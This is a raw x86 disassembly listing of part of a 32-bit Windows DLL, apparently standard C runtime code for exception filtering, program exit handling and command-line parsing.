1000456b:	74 17                	je     0x10004584
1000456d:	ff 75 08             	push   0x8(%ebp)
10004570:	8b ce                	mov    %esi,%ecx
10004572:	ff 15 5c d1 00 10    	call   *0x1000d15c
10004578:	ff d6                	call   *%esi
1000457a:	59                   	pop    %ecx
1000457b:	85 c0                	test   %eax,%eax
1000457d:	74 05                	je     0x10004584
1000457f:	33 c0                	xor    %eax,%eax
10004581:	40                   	inc    %eax
10004582:	eb 02                	jmp    0x10004586
10004584:	33 c0                	xor    %eax,%eax
10004586:	5e                   	pop    %esi
10004587:	5d                   	pop    %ebp
10004588:	c3                   	ret
10004589:	6a 0c                	push   $0xc
1000458b:	68 78 23 01 10       	push   $0x10012378
10004590:	e8 0b e1 ff ff       	call   0x100026a0
10004595:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
10004599:	6a 00                	push   $0x0
1000459b:	e8 8c 23 00 00       	call   0x1000692c
100045a0:	59                   	pop    %ecx
100045a1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100045a5:	8b 35 04 30 01 10    	mov    0x10013004,%esi
100045ab:	8b ce                	mov    %esi,%ecx
100045ad:	83 e1 1f             	and    $0x1f,%ecx
100045b0:	33 35 20 41 01 10    	xor    0x10014120,%esi
100045b6:	d3 ce                	ror    %cl,%esi
100045b8:	89 75 e4             	mov    %esi,-0x1c(%ebp)
100045bb:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100045c2:	e8 15 00 00 00       	call   0x100045dc
100045c7:	8b c6                	mov    %esi,%eax
100045c9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100045cc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100045d3:	59                   	pop    %ecx
100045d4:	5f                   	pop    %edi
100045d5:	5e                   	pop    %esi
100045d6:	5b                   	pop    %ebx
100045d7:	c9                   	leave
100045d8:	c3                   	ret
100045d9:	8b 75 e4             	mov    -0x1c(%ebp),%esi
100045dc:	6a 00                	push   $0x0
100045de:	e8 91 23 00 00       	call   0x10006974
100045e3:	59                   	pop    %ecx
100045e4:	c3                   	ret
100045e5:	8b ff                	mov    %edi,%edi
100045e7:	55                   	push   %ebp
100045e8:	8b ec                	mov    %esp,%ebp
100045ea:	b8 63 73 6d e0       	mov    $0xe06d7363,%eax
100045ef:	39 45 08             	cmp    %eax,0x8(%ebp)
100045f2:	74 04                	je     0x100045f8
100045f4:	33 c0                	xor    %eax,%eax
100045f6:	5d                   	pop    %ebp
100045f7:	c3                   	ret
100045f8:	ff 75 0c             	push   0xc(%ebp)
100045fb:	50                   	push   %eax
100045fc:	e8 04 00 00 00       	call   0x10004605
10004601:	59                   	pop    %ecx
10004602:	59                   	pop    %ecx
10004603:	5d                   	pop    %ebp
10004604:	c3                   	ret
10004605:	8b ff                	mov    %edi,%edi
10004607:	55                   	push   %ebp
10004608:	8b ec                	mov    %esp,%ebp
1000460a:	51                   	push   %ecx
1000460b:	53                   	push   %ebx
1000460c:	56                   	push   %esi
1000460d:	57                   	push   %edi
1000460e:	e8 bc 20 00 00       	call   0x100066cf
10004613:	8b f0                	mov    %eax,%esi
10004615:	85 f6                	test   %esi,%esi
10004617:	0f 84 39 01 00 00    	je     0x10004756
1000461d:	8b 16                	mov    (%esi),%edx
1000461f:	33 db                	xor    %ebx,%ebx
10004621:	8b ca                	mov    %edx,%ecx
10004623:	8d 82 90 00 00 00    	lea    0x90(%edx),%eax
10004629:	3b d0                	cmp    %eax,%edx
1000462b:	74 0e                	je     0x1000463b
1000462d:	8b 7d 08             	mov    0x8(%ebp),%edi
10004630:	39 39                	cmp    %edi,(%ecx)
10004632:	74 09                	je     0x1000463d
10004634:	83 c1 0c             	add    $0xc,%ecx
10004637:	3b c8                	cmp    %eax,%ecx
10004639:	75 f5                	jne    0x10004630
1000463b:	8b cb                	mov    %ebx,%ecx
1000463d:	85 c9                	test   %ecx,%ecx
1000463f:	0f 84 11 01 00 00    	je     0x10004756
10004645:	8b 79 08             	mov    0x8(%ecx),%edi
10004648:	85 ff                	test   %edi,%edi
1000464a:	0f 84 06 01 00 00    	je     0x10004756
10004650:	83 ff 05             	cmp    $0x5,%edi
10004653:	75 0b                	jne    0x10004660
10004655:	33 c0                	xor    %eax,%eax
10004657:	89 59 08             	mov    %ebx,0x8(%ecx)
1000465a:	40                   	inc    %eax
1000465b:	e9 f8 00 00 00       	jmp    0x10004758
10004660:	83 ff 01             	cmp    $0x1,%edi
10004663:	75 08                	jne    0x1000466d
10004665:	83 c8 ff             	or     $0xffffffff,%eax
10004668:	e9 eb 00 00 00       	jmp    0x10004758
1000466d:	8b 46 04             	mov    0x4(%esi),%eax
10004670:	89 45 fc             	mov    %eax,-0x4(%ebp)
10004673:	8b 45 0c             	mov    0xc(%ebp),%eax
10004676:	89 46 04             	mov    %eax,0x4(%esi)
10004679:	83 79 04 08          	cmpl   $0x8,0x4(%ecx)
1000467d:	0f 85 b7 00 00 00    	jne    0x1000473a
10004683:	8d 42 24             	lea    0x24(%edx),%eax
10004686:	8d 50 6c             	lea    0x6c(%eax),%edx
10004689:	eb 06                	jmp    0x10004691
1000468b:	89 58 08             	mov    %ebx,0x8(%eax)
1000468e:	83 c0 0c             	add    $0xc,%eax
10004691:	3b c2                	cmp    %edx,%eax
10004693:	75 f6                	jne    0x1000468b
10004695:	8b 5e 08             	mov    0x8(%esi),%ebx
10004698:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
1000469d:	39 01                	cmp    %eax,(%ecx)
1000469f:	77 47                	ja     0x100046e8
100046a1:	74 3e                	je     0x100046e1
100046a3:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%ecx)
100046a9:	74 2f                	je     0x100046da
100046ab:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%ecx)
100046b1:	74 20                	je     0x100046d3
100046b3:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%ecx)
100046b9:	74 11                	je     0x100046cc
100046bb:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%ecx)
100046c1:	8b c3                	mov    %ebx,%eax
100046c3:	75 62                	jne    0x10004727
100046c5:	b8 81 00 00 00       	mov    $0x81,%eax
100046ca:	eb 58                	jmp    0x10004724
100046cc:	b8 86 00 00 00       	mov    $0x86,%eax
100046d1:	eb 51                	jmp    0x10004724
100046d3:	b8 83 00 00 00       	mov    $0x83,%eax
100046d8:	eb 4a                	jmp    0x10004724
100046da:	b8 82 00 00 00       	mov    $0x82,%eax
100046df:	eb 43                	jmp    0x10004724
100046e1:	b8 84 00 00 00       	mov    $0x84,%eax
100046e6:	eb 3c                	jmp    0x10004724
100046e8:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%ecx)
100046ee:	74 2f                	je     0x1000471f
100046f0:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%ecx)
100046f6:	74 20                	je     0x10004718
100046f8:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%ecx)
100046fe:	74 11                	je     0x10004711
10004700:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%ecx)
10004706:	8b c3                	mov    %ebx,%eax
10004708:	75 1d                	jne    0x10004727
1000470a:	b8 8d 00 00 00       	mov    $0x8d,%eax
1000470f:	eb 13                	jmp    0x10004724
10004711:	b8 8e 00 00 00       	mov    $0x8e,%eax
10004716:	eb 0c                	jmp    0x10004724
10004718:	b8 85 00 00 00       	mov    $0x85,%eax
1000471d:	eb 05                	jmp    0x10004724
1000471f:	b8 8a 00 00 00       	mov    $0x8a,%eax
10004724:	89 46 08             	mov    %eax,0x8(%esi)
10004727:	50                   	push   %eax
10004728:	6a 08                	push   $0x8
1000472a:	8b cf                	mov    %edi,%ecx
1000472c:	ff 15 5c d1 00 10    	call   *0x1000d15c
10004732:	ff d7                	call   *%edi
10004734:	59                   	pop    %ecx
10004735:	89 5e 08             	mov    %ebx,0x8(%esi)
10004738:	eb 10                	jmp    0x1000474a
1000473a:	ff 71 04             	push   0x4(%ecx)
1000473d:	89 59 08             	mov    %ebx,0x8(%ecx)
10004740:	8b cf                	mov    %edi,%ecx
10004742:	ff 15 5c d1 00 10    	call   *0x1000d15c
10004748:	ff d7                	call   *%edi
1000474a:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000474d:	59                   	pop    %ecx
1000474e:	89 46 04             	mov    %eax,0x4(%esi)
10004751:	e9 0f ff ff ff       	jmp    0x10004665
10004756:	33 c0                	xor    %eax,%eax
10004758:	5f                   	pop    %edi
10004759:	5e                   	pop    %esi
1000475a:	5b                   	pop    %ebx
1000475b:	c9                   	leave
1000475c:	c3                   	ret
1000475d:	6a 08                	push   $0x8
1000475f:	68 b8 23 01 10       	push   $0x100123b8
10004764:	e8 37 df ff ff       	call   0x100026a0
10004769:	8b 45 08             	mov    0x8(%ebp),%eax
1000476c:	ff 30                	push   (%eax)
1000476e:	e8 b9 21 00 00       	call   0x1000692c
10004773:	59                   	pop    %ecx
10004774:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10004778:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000477b:	e8 2a 00 00 00       	call   0x100047aa
10004780:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10004787:	e8 12 00 00 00       	call   0x1000479e
1000478c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000478f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10004796:	59                   	pop    %ecx
10004797:	5f                   	pop    %edi
10004798:	5e                   	pop    %esi
10004799:	5b                   	pop    %ebx
1000479a:	c9                   	leave
1000479b:	c2 0c 00             	ret    $0xc
1000479e:	8b 45 10             	mov    0x10(%ebp),%eax
100047a1:	ff 30                	push   (%eax)
100047a3:	e8 cc 21 00 00       	call   0x10006974
100047a8:	59                   	pop    %ecx
100047a9:	c3                   	ret
100047aa:	6a 08                	push   $0x8
100047ac:	68 98 23 01 10       	push   $0x10012398
100047b1:	e8 ea de ff ff       	call   0x100026a0
100047b6:	8b f1                	mov    %ecx,%esi
100047b8:	80 3d 2c 41 01 10 00 	cmpb   $0x0,0x1001412c
100047bf:	0f 85 96 00 00 00    	jne    0x1000485b
100047c5:	33 c0                	xor    %eax,%eax
100047c7:	40                   	inc    %eax
100047c8:	b9 24 41 01 10       	mov    $0x10014124,%ecx
100047cd:	87 01                	xchg   %eax,(%ecx)
100047cf:	33 db                	xor    %ebx,%ebx
100047d1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100047d4:	8b 06                	mov    (%esi),%eax
100047d6:	8b 00                	mov    (%eax),%eax
100047d8:	85 c0                	test   %eax,%eax
100047da:	75 2c                	jne    0x10004808
100047dc:	8b 3d 04 30 01 10    	mov    0x10013004,%edi
100047e2:	8b cf                	mov    %edi,%ecx
100047e4:	83 e1 1f             	and    $0x1f,%ecx
100047e7:	a1 28 41 01 10       	mov    0x10014128,%eax
100047ec:	3b c7                	cmp    %edi,%eax
100047ee:	74 11                	je     0x10004801
100047f0:	33 f8                	xor    %eax,%edi
100047f2:	d3 cf                	ror    %cl,%edi
100047f4:	53                   	push   %ebx
100047f5:	53                   	push   %ebx
100047f6:	53                   	push   %ebx
100047f7:	8b cf                	mov    %edi,%ecx
100047f9:	ff 15 5c d1 00 10    	call   *0x1000d15c
100047ff:	ff d7                	call   *%edi
10004801:	68 48 42 01 10       	push   $0x10014248
10004806:	eb 0a                	jmp    0x10004812
10004808:	83 f8 01             	cmp    $0x1,%eax
1000480b:	75 0b                	jne    0x10004818
1000480d:	68 54 42 01 10       	push   $0x10014254
10004812:	e8 20 08 00 00       	call   0x10005037
10004817:	59                   	pop    %ecx
10004818:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
1000481f:	8b 06                	mov    (%esi),%eax
10004821:	39 18                	cmp    %ebx,(%eax)
10004823:	75 11                	jne    0x10004836
10004825:	68 8c d1 00 10       	push   $0x1000d18c
1000482a:	68 7c d1 00 10       	push   $0x1000d17c
1000482f:	e8 a6 fc ff ff       	call   0x100044da
10004834:	59                   	pop    %ecx
10004835:	59                   	pop    %ecx
10004836:	68 94 d1 00 10       	push   $0x1000d194
1000483b:	68 90 d1 00 10       	push   $0x1000d190
10004840:	e8 95 fc ff ff       	call   0x100044da
10004845:	59                   	pop    %ecx
10004846:	59                   	pop    %ecx
10004847:	8b 46 04             	mov    0x4(%esi),%eax
1000484a:	39 18                	cmp    %ebx,(%eax)
1000484c:	75 0d                	jne    0x1000485b
1000484e:	c6 05 2c 41 01 10 01 	movb   $0x1,0x1001412c
10004855:	8b 46 08             	mov    0x8(%esi),%eax
10004858:	c6 00 01             	movb   $0x1,(%eax)
1000485b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000485e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10004865:	59                   	pop    %ecx
10004866:	5f                   	pop    %edi
10004867:	5e                   	pop    %esi
10004868:	5b                   	pop    %ebx
10004869:	c9                   	leave
1000486a:	c3                   	ret
1000486b:	8b 45 ec             	mov    -0x14(%ebp),%eax
1000486e:	8b 00                	mov    (%eax),%eax
10004870:	ff 30                	push   (%eax)
10004872:	e8 0d 00 00 00       	call   0x10004884
10004877:	83 c4 04             	add    $0x4,%esp
1000487a:	c3                   	ret
1000487b:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000487e:	e8 8e 09 00 00       	call   0x10005211
10004883:	cc                   	int3
10004884:	8b ff                	mov    %edi,%edi
10004886:	55                   	push   %ebp
10004887:	8b ec                	mov    %esp,%ebp
10004889:	33 c0                	xor    %eax,%eax
1000488b:	81 7d 08 63 73 6d e0 	cmpl   $0xe06d7363,0x8(%ebp)
10004892:	0f 94 c0             	sete   %al
10004895:	5d                   	pop    %ebp
10004896:	c3                   	ret
10004897:	8b ff                	mov    %edi,%edi
10004899:	55                   	push   %ebp
1000489a:	8b ec                	mov    %esp,%ebp
1000489c:	83 ec 18             	sub    $0x18,%esp
1000489f:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
100048a3:	75 12                	jne    0x100048b7
100048a5:	e8 93 00 00 00       	call   0x1000493d
100048aa:	84 c0                	test   %al,%al
100048ac:	74 09                	je     0x100048b7
100048ae:	ff 75 08             	push   0x8(%ebp)
100048b1:	e8 ca 00 00 00       	call   0x10004980
100048b6:	59                   	pop    %ecx
100048b7:	8d 45 0c             	lea    0xc(%ebp),%eax
100048ba:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
100048be:	89 45 e8             	mov    %eax,-0x18(%ebp)
100048c1:	8d 4d fe             	lea    -0x2(%ebp),%ecx
100048c4:	8d 45 10             	lea    0x10(%ebp),%eax
100048c7:	89 45 ec             	mov    %eax,-0x14(%ebp)
100048ca:	8d 45 ff             	lea    -0x1(%ebp),%eax
100048cd:	6a 02                	push   $0x2
100048cf:	89 45 f0             	mov    %eax,-0x10(%ebp)
100048d2:	58                   	pop    %eax
100048d3:	89 45 f8             	mov    %eax,-0x8(%ebp)
100048d6:	89 45 f4             	mov    %eax,-0xc(%ebp)
100048d9:	8d 45 f8             	lea    -0x8(%ebp),%eax
100048dc:	50                   	push   %eax
100048dd:	8d 45 e8             	lea    -0x18(%ebp),%eax
100048e0:	50                   	push   %eax
100048e1:	8d 45 f4             	lea    -0xc(%ebp),%eax
100048e4:	50                   	push   %eax
100048e5:	e8 73 fe ff ff       	call   0x1000475d
100048ea:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
100048ee:	74 02                	je     0x100048f2
100048f0:	c9                   	leave
100048f1:	c3                   	ret
100048f2:	ff 75 08             	push   0x8(%ebp)
100048f5:	e8 01 00 00 00       	call   0x100048fb
100048fa:	cc                   	int3
100048fb:	8b ff                	mov    %edi,%edi
100048fd:	55                   	push   %ebp
100048fe:	8b ec                	mov    %esp,%ebp
10004900:	e8 86 20 00 00       	call   0x1000698b
10004905:	83 f8 01             	cmp    $0x1,%eax
10004908:	74 20                	je     0x1000492a
1000490a:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
10004910:	8b 40 68             	mov    0x68(%eax),%eax
10004913:	c1 e8 08             	shr    $0x8,%eax
10004916:	a8 01                	test   $0x1,%al
10004918:	75 10                	jne    0x1000492a
1000491a:	ff 75 08             	push   0x8(%ebp)
1000491d:	ff 15 5c d0 00 10    	call   *0x1000d05c
10004923:	50                   	push   %eax
10004924:	ff 15 60 d0 00 10    	call   *0x1000d060
1000492a:	ff 75 08             	push   0x8(%ebp)
1000492d:	e8 4e 00 00 00       	call   0x10004980
10004932:	59                   	pop    %ecx
10004933:	ff 75 08             	push   0x8(%ebp)
10004936:	ff 15 c4 d0 00 10    	call   *0x1000d0c4
1000493c:	cc                   	int3
1000493d:	6a 00                	push   $0x0
1000493f:	ff 15 84 d0 00 10    	call   *0x1000d084
10004945:	85 c0                	test   %eax,%eax
10004947:	74 34                	je     0x1000497d
10004949:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
1000494e:	66 39 08             	cmp    %cx,(%eax)
10004951:	75 2a                	jne    0x1000497d
10004953:	8b 48 3c             	mov    0x3c(%eax),%ecx
10004956:	03 c8                	add    %eax,%ecx
10004958:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
1000495e:	75 1d                	jne    0x1000497d
10004960:	b8 0b 01 00 00       	mov    $0x10b,%eax
10004965:	66 39 41 18          	cmp    %ax,0x18(%ecx)
10004969:	75 12                	jne    0x1000497d
1000496b:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
1000496f:	76 0c                	jbe    0x1000497d
10004971:	83 b9 e8 00 00 00 00 	cmpl   $0x0,0xe8(%ecx)
10004978:	74 03                	je     0x1000497d
1000497a:	b0 01                	mov    $0x1,%al
1000497c:	c3                   	ret
1000497d:	32 c0                	xor    %al,%al
1000497f:	c3                   	ret
10004980:	8b ff                	mov    %edi,%edi
10004982:	55                   	push   %ebp
10004983:	8b ec                	mov    %esp,%ebp
10004985:	51                   	push   %ecx
10004986:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000498a:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000498d:	50                   	push   %eax
1000498e:	68 6c dd 00 10       	push   $0x1000dd6c
10004993:	6a 00                	push   $0x0
10004995:	ff 15 c8 d0 00 10    	call   *0x1000d0c8
1000499b:	85 c0                	test   %eax,%eax
1000499d:	74 23                	je     0x100049c2
1000499f:	56                   	push   %esi
100049a0:	68 84 dd 00 10       	push   $0x1000dd84
100049a5:	ff 75 fc             	push   -0x4(%ebp)
100049a8:	ff 15 bc d0 00 10    	call   *0x1000d0bc
100049ae:	8b f0                	mov    %eax,%esi
100049b0:	85 f6                	test   %esi,%esi
100049b2:	74 0d                	je     0x100049c1
100049b4:	ff 75 08             	push   0x8(%ebp)
100049b7:	8b ce                	mov    %esi,%ecx
100049b9:	ff 15 5c d1 00 10    	call   *0x1000d15c
100049bf:	ff d6                	call   *%esi
100049c1:	5e                   	pop    %esi
100049c2:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
100049c6:	74 09                	je     0x100049d1
100049c8:	ff 75 fc             	push   -0x4(%ebp)
100049cb:	ff 15 b8 d0 00 10    	call   *0x1000d0b8
100049d1:	c9                   	leave
100049d2:	c3                   	ret
100049d3:	8b ff                	mov    %edi,%edi
100049d5:	55                   	push   %ebp
100049d6:	8b ec                	mov    %esp,%ebp
100049d8:	8b 45 08             	mov    0x8(%ebp),%eax
100049db:	a3 28 41 01 10       	mov    %eax,0x10014128
100049e0:	5d                   	pop    %ebp
100049e1:	c3                   	ret
100049e2:	6a 01                	push   $0x1
100049e4:	6a 00                	push   $0x0
100049e6:	6a 00                	push   $0x0
100049e8:	e8 aa fe ff ff       	call   0x10004897
100049ed:	83 c4 0c             	add    $0xc,%esp
100049f0:	c3                   	ret
100049f1:	8b ff                	mov    %edi,%edi
100049f3:	55                   	push   %ebp
100049f4:	8b ec                	mov    %esp,%ebp
100049f6:	6a 00                	push   $0x0
100049f8:	6a 02                	push   $0x2
100049fa:	ff 75 08             	push   0x8(%ebp)
100049fd:	e8 95 fe ff ff       	call   0x10004897
10004a02:	83 c4 0c             	add    $0xc,%esp
10004a05:	5d                   	pop    %ebp
10004a06:	c3                   	ret
10004a07:	a1 24 41 01 10       	mov    0x10014124,%eax
10004a0c:	90                   	nop
10004a0d:	c3                   	ret
10004a0e:	8b ff                	mov    %edi,%edi
10004a10:	55                   	push   %ebp
10004a11:	8b ec                	mov    %esp,%ebp
10004a13:	83 ec 10             	sub    $0x10,%esp
10004a16:	53                   	push   %ebx
10004a17:	8b 5d 08             	mov    0x8(%ebp),%ebx
10004a1a:	85 db                	test   %ebx,%ebx
10004a1c:	75 07                	jne    0x10004a25
10004a1e:	33 c0                	xor    %eax,%eax
10004a20:	e9 1c 01 00 00       	jmp    0x10004b41
10004a25:	56                   	push   %esi
10004a26:	83 fb 02             	cmp    $0x2,%ebx
10004a29:	74 1b                	je     0x10004a46
10004a2b:	83 fb 01             	cmp    $0x1,%ebx
10004a2e:	74 16                	je     0x10004a46
10004a30:	e8 e1 0b 00 00       	call   0x10005616
10004a35:	6a 16                	push   $0x16
10004a37:	5e                   	pop    %esi
10004a38:	89 30                	mov    %esi,(%eax)
10004a3a:	e8 1a 0b 00 00       	call   0x10005559
10004a3f:	8b c6                	mov    %esi,%eax
10004a41:	e9 fa 00 00 00       	jmp    0x10004b40
10004a46:	57                   	push   %edi
10004a47:	e8 63 2e 00 00       	call   0x100078af
10004a4c:	68 04 01 00 00       	push   $0x104
10004a51:	be 30 41 01 10       	mov    $0x10014130,%esi
10004a56:	33 ff                	xor    %edi,%edi
10004a58:	56                   	push   %esi
10004a59:	57                   	push   %edi
10004a5a:	e8 91 28 00 00       	call   0x100072f0
10004a5f:	a1 d8 46 01 10       	mov    0x100146d8,%eax
10004a64:	83 c4 0c             	add    $0xc,%esp
10004a67:	89 35 c8 46 01 10    	mov    %esi,0x100146c8
10004a6d:	89 45 f0             	mov    %eax,-0x10(%ebp)
10004a70:	85 c0                	test   %eax,%eax
10004a72:	74 05                	je     0x10004a79
10004a74:	80 38 00             	cmpb   $0x0,(%eax)
10004a77:	75 05                	jne    0x10004a7e
10004a79:	8b c6                	mov    %esi,%eax
10004a7b:	89 75 f0             	mov    %esi,-0x10(%ebp)
10004a7e:	8d 4d f4             	lea    -0xc(%ebp),%ecx
10004a81:	89 7d fc             	mov    %edi,-0x4(%ebp)
10004a84:	51                   	push   %ecx
10004a85:	8d 4d fc             	lea    -0x4(%ebp),%ecx
10004a88:	89 7d f4             	mov    %edi,-0xc(%ebp)
10004a8b:	51                   	push   %ecx
10004a8c:	57                   	push   %edi
10004a8d:	57                   	push   %edi
10004a8e:	50                   	push   %eax
10004a8f:	e8 b0 00 00 00       	call   0x10004b44
10004a94:	6a 01                	push   $0x1
10004a96:	ff 75 f4             	push   -0xc(%ebp)
10004a99:	ff 75 fc             	push   -0x4(%ebp)
10004a9c:	e8 1a 02 00 00       	call   0x10004cbb
10004aa1:	8b f0                	mov    %eax,%esi
10004aa3:	83 c4 20             	add    $0x20,%esp
10004aa6:	85 f6                	test   %esi,%esi
10004aa8:	75 0c                	jne    0x10004ab6
10004aaa:	e8 67 0b 00 00       	call   0x10005616
10004aaf:	6a 0c                	push   $0xc
10004ab1:	5f                   	pop    %edi
10004ab2:	89 38                	mov    %edi,(%eax)
10004ab4:	eb 32                	jmp    0x10004ae8
10004ab6:	8d 45 f4             	lea    -0xc(%ebp),%eax
10004ab9:	50                   	push   %eax
10004aba:	8d 45 fc             	lea    -0x4(%ebp),%eax
10004abd:	50                   	push   %eax
10004abe:	8b 45 fc             	mov    -0x4(%ebp),%eax
10004ac1:	8d 04 86             	lea    (%esi,%eax,4),%eax
10004ac4:	50                   	push   %eax
10004ac5:	56                   	push   %esi
10004ac6:	ff 75 f0             	push   -0x10(%ebp)
10004ac9:	e8 76 00 00 00       	call   0x10004b44
10004ace:	83 c4 14             	add    $0x14,%esp
10004ad1:	83 fb 01             	cmp    $0x1,%ebx
10004ad4:	75 16                	jne    0x10004aec
10004ad6:	8b 45 fc             	mov    -0x4(%ebp),%eax
10004ad9:	48                   	dec    %eax
10004ada:	a3 cc 46 01 10       	mov    %eax,0x100146cc
10004adf:	8b c6                	mov    %esi,%eax
10004ae1:	8b f7                	mov    %edi,%esi
10004ae3:	a3 d0 46 01 10       	mov    %eax,0x100146d0
10004ae8:	8b df                	mov    %edi,%ebx
10004aea:	eb 4a                	jmp    0x10004b36
10004aec:	8d 45 f8             	lea    -0x8(%ebp),%eax
10004aef:	89 7d f8             	mov    %edi,-0x8(%ebp)
10004af2:	50                   	push   %eax
10004af3:	56                   	push   %esi
10004af4:	e8 ea 26 00 00       	call   0x100071e3
10004af9:	8b d8                	mov    %eax,%ebx
10004afb:	59                   	pop    %ecx
10004afc:	59                   	pop    %ecx
10004afd:	85 db                	test   %ebx,%ebx
10004aff:	74 05                	je     0x10004b06
10004b01:	8b 45 f8             	mov    -0x8(%ebp),%eax
10004b04:	eb 26                	jmp    0x10004b2c
10004b06:	8b 55 f8             	mov    -0x8(%ebp),%edx
10004b09:	8b cf                	mov    %edi,%ecx
10004b0b:	8b c2                	mov    %edx,%eax
10004b0d:	39 3a                	cmp    %edi,(%edx)
10004b0f:	74 08                	je     0x10004b19
10004b11:	8d 40 04             	lea    0x4(%eax),%eax
10004b14:	41                   	inc    %ecx
10004b15:	39 38                	cmp    %edi,(%eax)
10004b17:	75 f8                	jne    0x10004b11
10004b19:	8b c7                	mov    %edi,%eax
10004b1b:	89 0d cc 46 01 10    	mov    %ecx,0x100146cc
10004b21:	89 45 f8             	mov    %eax,-0x8(%ebp)
10004b24:	8b df                	mov    %edi,%ebx
10004b26:	89 15 d0 46 01 10    	mov    %edx,0x100146d0
10004b2c:	50                   	push   %eax
10004b2d:	e8 54 0b 00 00       	call   0x10005686
10004b32:	59                   	pop    %ecx
10004b33:	89 7d f8             	mov    %edi,-0x8(%ebp)
10004b36:	56                   	push   %esi
10004b37:	e8 4a 0b 00 00       	call   0x10005686
10004b3c:	59                   	pop    %ecx
10004b3d:	8b c3                	mov    %ebx,%eax
10004b3f:	5f                   	pop    %edi
10004b40:	5e                   	pop    %esi
10004b41:	5b                   	pop    %ebx
10004b42:	c9                   	leave
10004b43:	c3                   	ret
10004b44:	8b ff                	mov    %edi,%edi
10004b46:	55                   	push   %ebp
10004b47:	8b ec                	mov    %esp,%ebp
10004b49:	51                   	push   %ecx
10004b4a:	8b 45 14             	mov    0x14(%ebp),%eax
10004b4d:	53                   	push   %ebx
10004b4e:	8b 5d 18             	mov    0x18(%ebp),%ebx
10004b51:	56                   	push   %esi
10004b52:	8b 75 10             	mov    0x10(%ebp),%esi
10004b55:	57                   	push   %edi
10004b56:	83 23 00             	andl   $0x0,(%ebx)
10004b59:	8b 7d 08             	mov    0x8(%ebp),%edi
10004b5c:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
10004b62:	8b 45 0c             	mov    0xc(%ebp),%eax
10004b65:	85 c0                	test   %eax,%eax
10004b67:	74 08                	je     0x10004b71
10004b69:	89 30                	mov    %esi,(%eax)
10004b6b:	83 c0 04             	add    $0x4,%eax
10004b6e:	89 45 0c             	mov    %eax,0xc(%ebp)
10004b71:	32 c9                	xor    %cl,%cl
10004b73:	88 4d ff             	mov    %cl,-0x1(%ebp)
10004b76:	80 3f 22             	cmpb   $0x22,(%edi)
10004b79:	75 0d                	jne    0x10004b88
10004b7b:	84 c9                	test   %cl,%cl
10004b7d:	b0 22                	mov    $0x22,%al
10004b7f:	0f 94 c1             	sete   %cl
10004b82:	47                   	inc    %edi
10004b83:	88 4d ff             	mov    %cl,-0x1(%ebp)
10004b86:	eb 35                	jmp    0x10004bbd
10004b88:	ff 03                	incl   (%ebx)
10004b8a:	85 f6                	test   %esi,%esi
10004b8c:	74 05                	je     0x10004b93
10004b8e:	8a 07                	mov    (%edi),%al
10004b90:	88 06                	mov    %al,(%esi)
10004b92:	46                   	inc    %esi
10004b93:	8a 07                	mov    (%edi),%al
10004b95:	47                   	inc    %edi
10004b96:	88 45 fe             	mov    %al,-0x2(%ebp)
10004b99:	0f be c0             	movsbl %al,%eax
10004b9c:	50                   	push   %eax
10004b9d:	e8 33 30 00 00       	call   0x10007bd5
10004ba2:	59                   	pop    %ecx
10004ba3:	85 c0                	test   %eax,%eax
10004ba5:	74 0c                	je     0x10004bb3
10004ba7:	ff 03                	incl   (%ebx)
10004ba9:	85 f6                	test   %esi,%esi
10004bab:	74 05                	je     0x10004bb2
10004bad:	8a 07                	mov    (%edi),%al
10004baf:	88 06                	mov    %al,(%esi)
10004bb1:	46                   	inc    %esi
10004bb2:	47                   	inc    %edi
10004bb3:	8a 45 fe             	mov    -0x2(%ebp),%al
10004bb6:	84 c0                	test   %al,%al
10004bb8:	74 19                	je     0x10004bd3
10004bba:	8a 4d ff             	mov    -0x1(%ebp),%cl
10004bbd:	84 c9                	test   %cl,%cl
10004bbf:	75 b5                	jne    0x10004b76
10004bc1:	3c 20                	cmp    $0x20,%al
10004bc3:	74 04                	je     0x10004bc9
10004bc5:	3c 09                	cmp    $0x9,%al
10004bc7:	75 ad                	jne    0x10004b76
10004bc9:	85 f6                	test   %esi,%esi
10004bcb:	74 07                	je     0x10004bd4
10004bcd:	c6 46 ff 00          	movb   $0x0,-0x1(%esi)
10004bd1:	eb 01                	jmp    0x10004bd4
10004bd3:	4f                   	dec    %edi
10004bd4:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
10004bd8:	8a 07                	mov    (%edi),%al
10004bda:	84 c0                	test   %al,%al
10004bdc:	0f 84 c5 00 00 00    	je     0x10004ca7
10004be2:	3c 20                	cmp    $0x20,%al
